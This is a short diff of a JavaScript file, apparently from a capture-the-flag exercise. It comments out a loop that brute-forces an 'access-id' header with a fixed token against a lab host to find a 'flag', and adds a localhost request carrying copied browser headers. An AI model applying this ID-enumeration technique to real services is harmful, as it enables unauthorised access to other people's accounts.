@@ -370,20 +370,42 @@ document.querySelector('form').addEventListener('change', (e) => {
 //     console.log(data)
 // })
 
-for(let i=1;i<=1000;i++){
-    console.log(i)
-    fetch('http://192.168.68.192:1377/users',{
-        'method':'GET',
-        headers:{
-            'token':'developer',
-            'access-id':i
-        }
-    })
-    .then(res=>{
-        if(res.status !==401){
-            console.log('found the flag',i)
-        }else{
-            console.log('not allowed incorrect id')
-        }
-    })
-}
+// for(let i=1;i<=1000;i++){
+//     console.log(i)
+//     fetch('http://192.168.68.192:1377/users',{
+//         'method':'GET',
+//         headers:{
+//             'token':'developer',
+//             'access-id':i
+//         }
+//     })
+//     .then(res=>{
+//         if(res.status !==401){
+//             console.log('found the flag',i)
+//         }else{
+//             console.log('not allowed incorrect id')
+//         }
+//     })
+// }
+
+
+fetch("http://localhost:3001/", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9,tr;q=0.8,nl;q=0.7",
+    "access-control-allow-origin": "wearedetectives.com",
+    "if-none-match": "W/\"d-+DlfNhy7NlTvvqpa4vYmcjxX7sk\"",
+    "sec-ch-ua": "\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Linux\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "cross-site"
+  },
+  "referrer": "http://127.0.0.1:5500/",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": null,
+  "method": "GET",
+  "mode": "cors",
+  "credentials": "omit"
+});
